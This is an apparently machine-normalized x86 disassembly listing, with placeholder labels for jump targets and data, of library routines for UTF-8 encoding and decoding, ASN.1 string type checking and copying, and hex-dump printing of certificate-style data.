cmp [ edx ] 0x0
jne r-xdata
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
lea edi [ edx + 0x1 ]
mov ebp edi
push edx
call sub_1001d740
add esp 0x4
mov eax 0x1
pop ecx
retn
test cl cl
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x41
jl r-xdata
cmp [ edi ] 0x0
je r-xdata
mov esi edi
sub esi ebp
push esi
push ebp
push ebx
call sub_100209d0
add esp 0xc
cmp eax esi
jne r-xdata
cmp al 0x5a
jg r-xdata
push edx
mov esi 0x1
call sub_1001d740
add esp 0x4
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
inc edi
jmp r-xdata
push 0x1f5
push r--data
push 0x7
push 0x75
push 0xb
call sub_1001de60
mov edx [ esp + 0x30 ]
mov esi [ esp + 0x24 ]
add esp 0x14
push edx
call sub_1001d740
add esp 0x4
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov al [ edi ]
lea ebp [ edi + 0x1 ]
test al al
je r-xdata
mov al [ edi + 0x2 ]
cmp al 0x3d
je r-xdata
mov cl [ edi ]
cmp cl 0x2f
jne r-xdata
mov edx [ esp + 0x1c ]
push 0x2
push r--data
push ebx
call sub_100209d0
add esp 0xc
cmp eax 0x2
jne r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x5a
jg r-xdata
cmp [ edi + 0x3 ] 0x3d
je r-xdata
sub_10066ff0
mov eax [ esp + 0x4 ]
cmp eax 0x102
je r-xdata
and ah 0xfe
cmp eax 0x10a
jne r-xdata
mov eax r--data
retn
cmp eax 0x1e
jg r-xdata
test eax eax
jl r-xdata
mov eax [ eax * 4 + rw-data ]
retn
sub_10067020
mov ecx [ esp + 0x8 ]
push esi
test ecx ecx
jg r-xdata
mov esi [ esp + 0x8 ]
mov al [ esi ]
test al 0x80
jne r-xdata
xor eax eax
pop esi
retn
mov dl al
and dl 0xe0
cmp dl 0xc0
jne r-xdata
mov edx [ esp + 0x10 ]
and eax 0x7f
mov ecx 0x1
pop esi
mov [ edx ] eax
mov eax ecx
retn
mov dl al
and dl 0xf0
cmp dl 0xe0
jne r-xdata
cmp ecx 0x2
jge r-xdata
mov dl al
and dl 0xf8
cmp dl 0xf0
jne r-xdata
cmp ecx 0x3
jge r-xdata
mov cl [ esi + 0x1 ]
mov dl cl
and dl 0xc0
cmp dl 0x80
je r-xdata
or eax 0xffffffff
pop esi
retn
mov dl al
and dl 0xfc
cmp dl 0xf8
jne r-xdata
cmp ecx 0x4
jge r-xdata
mov cl [ esi + 0x1 ]
and cl 0xc0
cmp cl 0x80
jne r-xdata
or eax 0xffffffff
pop esi
retn
and eax 0x1f
and ecx 0x3f
shl eax 0x6
or eax ecx
cmp eax 0x80
jae r-xdata
mov eax 0xfffffffd
pop esi
retn
mov dl al
and dl 0xfe
cmp dl 0xfc
jne r-xdata
cmp ecx 0x5
jge r-xdata
mov dl [ esi + 0x1 ]
lea ecx [ esi + 0x1 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
or eax 0xffffffff
pop esi
retn
mov dl [ esi + 0x2 ]
and dl 0xc0
cmp dl cl
jne r-xdata
mov edx [ esp + 0x10 ]
mov ecx 0x2
pop esi
mov [ edx ] eax
mov eax ecx
retn
mov eax 0xfffffffc
pop esi
retn
mov eax 0xfffffffe
pop esi
retn
cmp ecx 0x6
jge r-xdata
mov dl [ esi + 0x1 ]
lea ecx [ esi + 0x1 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
or eax 0xffffffff
pop esi
retn
mov dl [ esi + 0x2 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov cl [ esi + 0x1 ]
mov dl [ esi + 0x2 ]
and ecx 0x3f
and eax 0xf
shl ecx 0x6
and edx 0x3f
shl eax 0xc
or ecx edx
or eax ecx
cmp eax 0x800
jae r-xdata
mov dl [ esi + 0x1 ]
lea ecx [ esi + 0x1 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
or eax 0xffffffff
pop esi
retn
mov dl [ esi + 0x2 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov dl [ esi + 0x3 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ esp + 0x10 ]
mov ecx 0x3
pop esi
mov [ edx ] eax
mov eax ecx
retn
mov eax 0xfffffffc
pop esi
retn
mov dl [ esi + 0x2 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov dl [ esi + 0x3 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov esi ecx
and eax 0x7
shl eax 0x12
mov cl [ esi ]
mov dl [ esi + 0x1 ]
and ecx 0x3f
and edx 0x3f
shl ecx 0xc
or eax ecx
mov cl [ esi + 0x2 ]
inc esi
and ecx 0x3f
shl edx 0x6
or edx ecx
or eax edx
cmp eax 0x10000
jae r-xdata
mov dl [ esi + 0x3 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov dl [ esi + 0x4 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ esp + 0x10 ]
mov ecx 0x4
pop esi
mov [ edx ] eax
mov eax ecx
retn
mov eax 0xfffffffc
pop esi
retn
mov dl [ esi + 0x4 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov esi ecx
and eax 0x3
shl eax 0x18
mov cl [ esi ]
mov dl [ esi + 0x1 ]
and ecx 0x3f
and edx 0x3f
shl ecx 0x12
or eax ecx
inc esi
shl edx 0xc
mov cl [ esi + 0x1 ]
or eax edx
mov dl [ esi + 0x2 ]
inc esi
and ecx 0x3f
and edx 0x3f
shl ecx 0x6
or ecx edx
or eax ecx
cmp eax 0x200000
jae r-xdata
mov dl [ esi + 0x5 ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ esp + 0x10 ]
mov ecx 0x5
pop esi
mov [ edx ] eax
mov eax ecx
retn
mov eax 0xfffffffc
pop esi
retn
mov esi ecx
and eax 0x1
shl eax 0x1e
mov cl [ esi ]
mov dl [ esi + 0x1 ]
and ecx 0x3f
and edx 0x3f
shl ecx 0x18
or eax ecx
inc esi
shl edx 0x12
mov cl [ esi + 0x1 ]
or eax edx
inc esi
and ecx 0x3f
shl ecx 0xc
mov dl [ esi + 0x1 ]
or eax ecx
mov cl [ esi + 0x2 ]
inc esi
and edx 0x3f
and ecx 0x3f
shl edx 0x6
or edx ecx
or eax edx
cmp eax 0x4000000
jae r-xdata
mov edx [ esp + 0x10 ]
mov ecx 0x6
pop esi
mov [ edx ] eax
mov eax ecx
retn
mov eax 0xfffffffc
pop esi
retn
sub_100672f0
mov ecx [ esp + 0x4 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x8 ]
test edx edx
jg r-xdata
mov edx 0x6
mov eax [ esp + 0xc ]
cmp eax 0x80
jae r-xdata
or eax 0xffffffff
retn
cmp eax 0x800
jae r-xdata
test ecx ecx
je r-xdata
cmp eax 0x10000
jae r-xdata
cmp edx 0x2
jge r-xdata
mov eax 0x1
retn
mov [ ecx ] al
cmp eax 0x200000
jae r-xdata
cmp edx 0x3
jge r-xdata
test ecx ecx
je r-xdata
or eax 0xffffffff
retn
cmp eax 0x4000000
jae r-xdata
cmp edx 0x4
jge r-xdata
test ecx ecx
je r-xdata
or eax 0xffffffff
retn
mov eax 0x2
retn
mov edx eax
and al 0x3f
shr edx 0x6
and dl 0x1f
or dl 0xc0
or al 0x80
mov [ ecx ] dl
mov [ ecx + 0x1 ] al
cmp edx 0x6
jge r-xdata
cmp edx 0x5
jge r-xdata
test ecx ecx
je r-xdata
or eax 0xffffffff
retn
mov eax 0x3
retn
mov edx eax
shr edx 0xc
and dl 0xf
or dl 0xe0
mov [ ecx ] dl
mov edx eax
shr edx 0x6
and dl 0x3f
inc ecx
and al 0x3f
or dl 0x80
or al 0x80
mov [ ecx ] dl
mov [ ecx + 0x1 ] al
test ecx ecx
je r-xdata
or eax 0xffffffff
retn
test ecx ecx
je r-xdata
or eax 0xffffffff
retn
mov eax 0x4
retn
mov edx eax
shr edx 0x12
and dl 0x7
or dl 0xf0
mov [ ecx ] dl
mov edx eax
shr edx 0xc
and dl 0x3f
inc ecx
or dl 0x80
mov [ ecx ] dl
mov edx eax
shr edx 0x6
and dl 0x3f
inc ecx
and al 0x3f
or dl 0x80
or al 0x80
mov [ ecx ] dl
mov [ ecx + 0x1 ] al
mov eax 0x6
retn
mov edx eax
shr edx 0x1e
and dl 0x1
or dl 0xfc
mov [ ecx ] dl
mov edx eax
shr edx 0x18
and dl 0x3f
inc ecx
or dl 0x80
mov [ ecx ] dl
mov edx eax
shr edx 0x12
and dl 0x3f
inc ecx
or dl 0x80
mov [ ecx ] dl
mov edx eax
shr edx 0xc
and dl 0x3f
inc ecx
or dl 0x80
mov [ ecx ] dl
mov edx eax
shr edx 0x6
and dl 0x3f
inc ecx
and al 0x3f
or dl 0x80
or al 0x80
mov [ ecx ] dl
mov [ ecx + 0x1 ] al
mov eax 0x5
retn
mov edx eax
shr edx 0x18
and dl 0x3
or dl 0xf8
mov [ ecx ] dl
mov edx eax
shr edx 0x12
and dl 0x3f
inc ecx
or dl 0x80
mov [ ecx ] dl
mov edx eax
shr edx 0xc
and dl 0x3f
inc ecx
or dl 0x80
mov [ ecx ] dl
mov edx eax
shr edx 0x6
and dl 0x3f
inc ecx
and al 0x3f
or dl 0x80
or al 0x80
mov [ ecx ] dl
mov [ ecx + 0x1 ] al
sub_10067490
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push 0x0
push 0x0
push eax
mov eax [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
push eax
push ecx
call sub_100674c0
add esp 0x1c
retn
sub_100674c0
mov eax 0x30
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x40 ]
push ebp
mov ebp [ esp + 0x40 ]
xor edx edx
push esi
cmp ebx 0xffffffff
push edi
mov [ esp + 0x18 ] edx
jne r-xdata
cmp [ esp + 0x54 ] edx
jne r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebx ecx
mov edi [ esp + 0x50 ]
lea eax [ edi - 0x1000 ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0x54 ] 0x2806
push 0x8e
push r--data
push 0xa0
jmp [ eax * 4 + jump_table_10067884 ]
test bl 0x1
je r-xdata
test bl 0x3
je r-xdata
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] edx
push eax
push sub_10067990
push 0x1000
push ebx
push ebp
call sub_100678b0
add esp 0x14
test eax eax
jge r-xdata
mov eax ebx
mov [ esp + 0x10 ] eax
jmp r-xdata
mov eax ebx
sar eax 0x1
mov [ esp + 0x10 ] eax
jmp r-xdata
push 0x6f
push r--data
push 0x81
jmp r-xdata
mov eax ebx
sar eax 0x2
mov [ esp + 0x10 ] eax
jmp r-xdata
push 0x78
push r--data
push 0x85
jmp r-xdata
mov eax [ esp + 0x10 ]
push 0x84
push r--data
push 0x86
jmp r-xdata
mov esi [ esp + 0x58 ]
test esi esi
jle r-xdata
push 0x7a
push 0xd
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov esi [ esp + 0x5c ]
test esi esi
jle r-xdata
cmp eax esi
jge r-xdata
lea edx [ esp + 0x54 ]
push edx
push sub_100679d0
push edi
push ebx
push ebp
call sub_100678b0
add esp 0x14
test eax eax
jge r-xdata
cmp eax esi
jle r-xdata
push 0x93
push r--data
push 0x98
push 0x7a
push 0xd
call sub_1001de60
push esi
push r--data
lea ecx [ esp + 0x3c ]
push 0x20
push ecx
call sub_100279b0
lea edx [ esp + 0x44 ]
push edx
push r--data
push 0x2
call sub_1001e1a0
add esp 0x30
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov eax [ esp + 0x54 ]
mov [ esp + 0x58 ] 0x1001
test al 0x2
je r-xdata
push 0xa2
push r--data
push 0x7c
jmp r-xdata
push 0x9a
push r--data
push 0x97
push 0x7a
push 0xd
call sub_1001de60
push esi
push r--data
lea eax [ esp + 0x3c ]
push 0x20
push eax
call sub_100279b0
lea ecx [ esp + 0x44 ]
push ecx
push r--data
push 0x2
call sub_1001e1a0
add esp 0x30
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
test al 0x10
je r-xdata
mov ebp 0x13
jmp r-xdata
test al 0x4
je r-xdata
mov ebp 0x16
jmp r-xdata
mov edi [ esp + 0x44 ]
test edi edi
jne r-xdata
test ah 0x8
je r-xdata
mov ebp 0x14
jmp r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x30
retn
test ah 0x1
je r-xdata
mov ebp 0x1e
mov [ esp + 0x58 ] 0x1002
jmp r-xdata
push ebp
mov [ esp + 0x50 ] 0x1
call sub_1002edc0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ esp + 0x4c ] 0x0
test eax eax
je r-xdata
mov ebp 0xc
mov [ esp + 0x58 ] 0x1000
mov ebp 0x1c
mov [ esp + 0x58 ] 0x1004
jmp r-xdata
mov [ edi ] esi
push 0xc5
push r--data
push 0x41
jmp r-xdata
mov [ esi + 0x4 ] ebp
jmp r-xdata
push eax
mov [ esi ] 0x0
call sub_1001d740
add esp 0x4
mov [ esi + 0x8 ] 0x0
add eax 0xfffff000
cmp eax 0x4
ja r-xdata
mov eax [ esp + 0x48 ]
push ebx
push eax
push esi
call sub_1002ec90
add esp 0xc
test eax eax
jne r-xdata
mov edi [ esp + 0x50 ]
mov eax [ esp + 0x58 ]
cmp edi eax
jne r-xdata
mov edx [ esp + 0x14 ]
push 0xea
inc edx
push r--data
push edx
call sub_1001d4c0
add esp 0xc
mov [ esp + 0x1c ] eax
test eax eax
jne r-xdata
jmp [ eax * 4 + jump_table_10067898 ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x30
retn
push 0xcd
push r--data
push 0x41
jmp r-xdata
mov eax [ esp + 0x14 ]
mov [ esi ] eax
mov ecx [ esp + 0x1c ]
mov [ esi + 0x8 ] ecx
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x1c ]
push ecx
mov [ eax + edx ] 0x0
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x4c ]
push edx
push edi
push ebx
push eax
call sub_100678b0
add esp 0x14
mov al [ esp + 0x4c ]
test al al
je r-xdata
mov ecx [ esp + 0x10 ]
mov [ esp + 0x18 ] sub_10067a70
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov edx [ esp + 0x10 ]
mov [ esp + 0x18 ] sub_10067a90
lea eax [ edx + edx ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov [ esp + 0x18 ] sub_10067ac0
lea edx [ ecx * 4 ]
mov [ esp + 0x14 ] edx
jmp r-xdata
mov ecx [ esp + 0x48 ]
lea eax [ esp + 0x14 ]
push eax
push sub_100679a0
push edi
push ebx
push ecx
mov [ esp + 0x28 ] 0x0
call sub_100678b0
add esp 0x14
mov [ esp + 0x18 ] sub_10067b00
push 0xec
push r--data
push 0x41
jmp r-xdata
push esi
call sub_1002ee10
add esp 0x4
sub_100678b0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
mov eax 0x1
mov ebx [ esp + 0x20 ]
mov ebp [ esp + 0x1c ]
mov esi [ esp + 0x14 ]
cmp ebp 0x1002
jne r-xdata
xor eax eax
mov al [ esi ]
inc esi
mov [ esp + 0x18 ] eax
dec edi
jmp r-xdata
cmp ebp 0x1004
jne r-xdata
xor eax eax
xor ecx ecx
mov ah [ esi ]
inc esi
mov [ esp + 0x18 ] eax
mov cl [ esi ]
or eax ecx
inc esi
mov [ esp + 0x18 ] eax
sub edi 0x2
jmp r-xdata
test ebx ebx
je r-xdata
lea eax [ esp + 0x18 ]
push eax
push edi
push esi
call sub_10067020
add esp 0xc
test eax eax
jl r-xdata
xor eax eax
xor edx edx
mov al [ esi ]
xor ecx ecx
shl eax 0x18
inc esi
mov [ esp + 0x18 ] eax
mov dl [ esi ]
shl edx 0x10
or eax edx
inc esi
mov [ esp + 0x18 ] eax
xor edx edx
mov ch [ esi ]
or eax ecx
inc esi
mov [ esp + 0x18 ] eax
mov dl [ esi ]
or eax edx
inc esi
mov [ esp + 0x18 ] eax
sub edi 0x4
jmp r-xdata
test edi edi
jne r-xdata
mov ecx [ esp + 0x24 ]
push ecx
push eax
call ebx
add esp 0x8
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
sub edi eax
add esi eax
mov eax [ esp + 0x18 ]
cmp ebp 0x1001
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_100679d0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov ebx [ edi ]
test bl 0x2
je r-xdata
test bl 0x10
je r-xdata
cmp esi 0x7f
ja r-xdata
test bl 0x4
je r-xdata
cmp esi 0x7f
jbe r-xdata
and ebx 0xfffffffd
cmp esi 0x61
jl r-xdata
test bh 0x8
je r-xdata
cmp esi 0xff
jbe r-xdata
and ebx 0xffffffef
cmp esi 0x41
jl r-xdata
cmp esi 0x7a
jle r-xdata
test ebx ebx
jne r-xdata
cmp esi 0xffff
jbe r-xdata
and ebx 0xfffffffb
cmp esi 0x30
jl r-xdata
cmp esi 0x5a
jle r-xdata
mov [ edi ] ebx
pop edi
pop esi
mov eax 0x1
pop ebx
retn
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
and bh 0xf7
cmp esi 0x20
je r-xdata
cmp esi 0x39
jle r-xdata
push esi
push r--data
call strchr
add esp 0x8
test eax eax
jne r-xdata
sub_10067a90
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ebx
mov ebx edx
mov ecx [ eax ]
shr ebx 0x8
mov [ ecx ] bl
mov [ ecx + 0x1 ] dl
mov ecx [ eax ]
pop ebx
add ecx 0x2
mov [ eax ] ecx
mov eax 0x1
retn
sub_10067ac0
mov ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
mov edx ecx
shr edx 0x18
mov eax [ esi ]
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x8
mov [ eax ] dl
mov [ eax + 0x1 ] cl
mov eax [ esi ]
add eax 0x4
mov [ esi ] eax
mov eax 0x1
pop esi
retn
sub_10067b00
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
push eax
push 0xff
mov ecx [ esi ]
push ecx
call sub_100672f0
mov ecx [ esi ]
add esp 0xc
add ecx eax
mov eax 0x1
mov [ esi ] ecx
pop esi
retn
sub_10067b30
push esi
push edi
mov edi [ esp + 0x10 ]
xor esi esi
xor edx edx
test edi edi
jg r-xdata
mov ecx [ esp + 0xc ]
test ecx ecx
je r-xdata
or edi 0xffffffff
mov eax 0x13
mov al [ ecx ]
test al al
je r-xdata
push ebx
test edx edx
pop ebx
je r-xdata
and eax 0xff
inc ecx
cmp eax 0x61
jl r-xdata
test esi esi
mov eax 0x16
jne r-xdata
pop edi
mov eax 0x14
pop esi
retn
cmp eax 0x41
jl r-xdata
cmp eax 0x7a
jle r-xdata
pop edi
pop esi
retn
cmp eax 0x20
je r-xdata
cmp eax 0x5a
jle r-xdata
test al 0x80
je r-xdata
cmp eax 0x30
jl r-xdata
mov al [ ecx ]
test al al
jne r-xdata
mov edx 0x1
cmp eax 0x27
je r-xdata
cmp eax 0x39
jle r-xdata
mov ebx edi
dec edi
test ebx ebx
je r-xdata
cmp eax 0x28
je r-xdata
cmp eax 0x29
je r-xdata
cmp eax 0x2b
je r-xdata
cmp eax 0x2c
je r-xdata
cmp eax 0x2d
je r-xdata
cmp eax 0x2e
je r-xdata
cmp eax 0x2f
je r-xdata
cmp eax 0x3a
je r-xdata
cmp eax 0x3d
je r-xdata
cmp eax 0x3f
je r-xdata
mov esi 0x1
sub_10067c00
mov eax 0xc
call sub_1001d0d0
push esi
mov esi [ esp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
pop esi
add esp 0xc
retn
lea ecx [ esp + 0x4 ]
push ecx
call [ eax + 0x8 ]
lea edx [ esp + 0x8 ]
add esp 0x4
test edx edx
mov [ esp + 0xc ] esi
jne r-xdata
call sub_10069240
mov [ rw-data ] eax
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
push 0x12d
push r--data
push 0x69
push 0x6c
push 0xe
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
add esp 0xc
retn
push eax
lea eax [ esp + 0x8 ]
push eax
call sub_1006a010
add esp 0x8
pop esi
add esp 0xc
retn
push 0x133
push r--data
push 0x6b
push 0x6c
push 0xe
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
add esp 0xc
retn
sub_10067ca0
mov eax 0xc
call sub_1001d0d0
push esi
mov esi [ esp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
push esi
call sub_1006a0d0
add esp 0xc
test eax eax
jne r-xdata
lea edx [ esp + 0x4 ]
push edi
push edx
call [ eax + 0x8 ]
mov edi [ esp + 0x20 ]
mov [ esp + 0x14 ] esi
mov esi [ esp + 0x24 ]
lea eax [ esp + 0xc ]
push esi
push edi
push eax
call sub_1006a0d0
add esp 0x10
test eax eax
jne r-xdata
call sub_10069240
mov [ rw-data ] eax
pop esi
add esp 0xc
retn
push 0x145
push r--data
push 0x6a
push 0x6d
push 0xe
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
add esp 0xc
retn
pop edi
lea ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
push 0x149
push r--data
push 0x6c
push 0x6d
push 0xe
call sub_1001de60
push esi
push r--data
push edi
push r--data
push 0x4
call sub_1001e1a0
add esp 0x28
xor eax eax
push 0x145
push r--data
push 0x6a
push 0x6d
push 0xe
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
add esp 0xc
retn
sub_10067d90
mov eax 0xc
call sub_1001d0d0
mov eax [ rw-data ]
test eax eax
jne r-xdata
lea ecx [ esp ]
push ecx
call [ eax + 0x8 ]
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x4 ]
add esp 0x4
mov [ esp + 0x8 ] edx
test eax eax
je r-xdata
call sub_10069240
mov [ rw-data ] eax
add esp 0xc
retn
mov edx [ esp ]
lea ecx [ esp ]
push ecx
call [ edx + 0x10 ]
add esp 0x4
sub_10067de0
mov ecx [ esp + 0x4 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
push 0x12d
push r--data
push 0x69
push 0x6c
push 0xe
call sub_1001de60
add esp 0x14
xor eax eax
retn
push eax
push ecx
call sub_1006a010
add esp 0x8
retn
push 0x133
push r--data
push 0x6b
push 0x6c
push 0xe
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_10067e40
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x18 ]
push edi
push ebx
push esi
call sub_1006a0d0
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push 0x149
push r--data
push 0x6c
push 0x6d
push 0xe
call sub_1001de60
push edi
push r--data
push ebx
push r--data
push 0x4
call sub_1001e1a0
add esp 0x28
xor eax eax
push 0x145
push r--data
push 0x6a
push 0x6d
push 0xe
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_10067ec0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
xor ebx ebx
test edi edi
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebp [ esp + 0x14 ]
test ah 0x1
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x1
push r--data
push ebp
call sub_100209d0
add esp 0xc
cmp eax 0x1
jne r-xdata
xor esi esi
test eax eax
jle r-xdata
push 0x2
push r--data
push ebp
call sub_100209d0
add esp 0xc
cmp eax 0x2
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov ebx eax
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
test esi esi
je r-xdata
add ebx eax
mov edx [ edi + 0x8 ]
xor ecx ecx
push 0x2
mov cl [ edx + esi ]
lea eax [ edx + esi ]
mov edx ecx
mov ecx [ rw-data ]
shr edx 0x4
mov dl [ edx + ecx ]
mov [ esp + 0x1c ] dl
mov al [ eax ]
and eax 0xf
lea edx [ esp + 0x1c ]
push edx
push ebp
mov cl [ eax + ecx ]
mov [ esp + 0x25 ] cl
call sub_100209d0
add esp 0xc
cmp eax 0x2
jne r-xdata
mov eax esi
mov ecx 0x23
cdq
idiv ecx
test edx edx
jne r-xdata
add ebx eax
mov eax [ edi ]
inc esi
cmp esi eax
jl r-xdata
push 0x2
push r--data
push ebp
call sub_100209d0
add esp 0xc
cmp eax 0x2
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
add ebx eax
sub_10067fb0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
xor ebx ebx
test edi edi
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
xor esi esi
test eax eax
jle r-xdata
mov eax [ esp + 0x14 ]
push 0x1
push r--data
push eax
call sub_100209d0
add esp 0xc
cmp eax 0x1
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov ebp [ esp + 0x14 ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov edx [ edi + 0x8 ]
xor ecx ecx
push 0x2
mov cl [ edx + esi ]
lea eax [ edx + esi ]
mov edx ecx
mov ecx [ rw-data ]
shr edx 0x4
mov dl [ edx + ecx ]
mov [ esp + 0x18 ] dl
mov al [ eax ]
and eax 0xf
lea edx [ esp + 0x18 ]
push edx
push ebp
mov cl [ eax + ecx ]
mov [ esp + 0x21 ] cl
call sub_100209d0
add esp 0xc
cmp eax 0x2
jne r-xdata
mov eax esi
mov ecx 0x23
cdq
idiv ecx
test edx edx
jne r-xdata
add ebx eax
mov eax [ edi ]
inc esi
cmp esi eax
jl r-xdata
push 0x2
push r--data
push ebp
call sub_100209d0
add esp 0xc
cmp eax 0x2
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
add ebx eax
sub_10068080
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
mov ebx [ esp + 0x14 ]
test ebx ebx
jne r-xdata
push 0x1aa
push r--data
push 0x43
push 0x7e
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
test [ eax + 0xc ] 0x1
jne r-xdata
mov ebx [ eax + 0x20 ]
test ebx ebx
jne r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
push 0x1bd
[ edi ]
not ecx
push r--data
push ecx
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
push 0x1b1
push r--data
push 0x6f
push 0x7e
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
push ebx
push esi
call sub_100267d0
add esp 0xc
push 0x1c1
push r--data
push 0x41
push 0x7e
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
push ebx
push eax
call ecx
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ eax ]
mov ecx [ ecx + 0x18 ]
test ecx ecx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_10068170
push esi
mov esi [ esp + 0xc ]
push esi
call sub_10036740
add esp 0x4
cmp eax 0x4
jl r-xdata
mov eax 0x1
pop esi
retn
cmp eax 0x5
jg r-xdata
mov eax [ rw-data ]
push eax
push esi
call sub_1005d810
add esp 0x4
push eax
call fputs
mov ecx [ rw-data ]
push ecx
call fflush
add esp 0xc
sub_100681c0
push esi
mov esi [ esp + 0xc ]
push esi
call sub_10036740
add esp 0x4
dec eax
je r-xdata
mov edx [ rw-data ]
push edx
push esi
call sub_1005d810
add esp 0x4
push eax
call fputs
mov eax [ rw-data ]
push eax
call fflush
add esp 0xc
push 0x1
push esi
call sub_100617a0
mov ecx [ esp + 0x10 ]
add esp 0x4
and eax 0x1
push eax
push esi
push ecx
call sub_10068340
add esp 0x10
dec eax
je r-xdata
push esi
call sub_1005d810
mov ecx [ rw-data ]
push eax
push r--data
push ecx
call fprintf
mov edx [ rw-data ]
push edx
call fflush
add esp 0x14
push 0x1
push esi
call sub_100617a0
add esp 0x4
and eax 0x1
push eax
mov eax [ esp + 0x10 ]
push esi
push eax
call sub_10068340
add esp 0x10
test eax eax
jle r-xdata
dec eax
jne r-xdata
pop esi
retn
push ebx
push edi
push esi
call sub_100617f0
push esi
mov edi eax
call sub_100617d0
add esp 0x8
mov eax 0x1
pop esi
retn
mov eax [ rw-data ]
push eax
push esi
call sub_1005d810
add esp 0x4
push eax
call fputs
mov ecx [ rw-data ]
